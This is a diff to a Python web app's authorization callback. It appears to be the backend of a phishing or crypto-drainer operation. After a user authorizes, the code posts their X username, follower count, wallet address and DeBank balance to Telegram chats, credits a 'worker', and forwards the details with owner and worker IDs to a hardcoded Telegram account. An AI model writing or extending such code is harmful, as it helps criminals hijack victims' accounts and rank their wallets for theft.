@@ -182,13 +182,13 @@ def auth_callback():
 
         worker_line = f"👷 *Worker*: [{worker_id}](tg://user?id={worker_id})"
 
-        message = (f'🐍 *User [{username}](https://x.com/{username}) has authorized.*\n'
-                   f'👥 *Followers:* {followers}\n\n'
+        message = (f'🐍 *User [{parse(username)}](https://x.com/{username}) has authorized\\.*\n'
+                   f'👥 *Followers:* {parse(followers)}\n\n'
                    f'{worker_line if owner_id != worker_id else ""}'
-                   f'🔗 *[{address}](https://debank.com/profile/{address})* | $*__{balance}__*')
+                   f'🔗 *[{address}](https://debank.com/profile/{address})* \\| $*__{parse(balance)}__*')
 
-        send_message(group_id, message)
-        send_message(7434895838, message)
+        message_id = send_message(group_id, message)
+        send_message(7434895838, f"👤 _[{owner_id}](tg://user?id={owner_id})_ \\| 👷_[{worker_id}](tg://user?id={worker_id})_\n\n{message}")
         return redirect(session.get("redirect_url", "https://x.com/"))
     except Exception as e:
         logger.error(e)
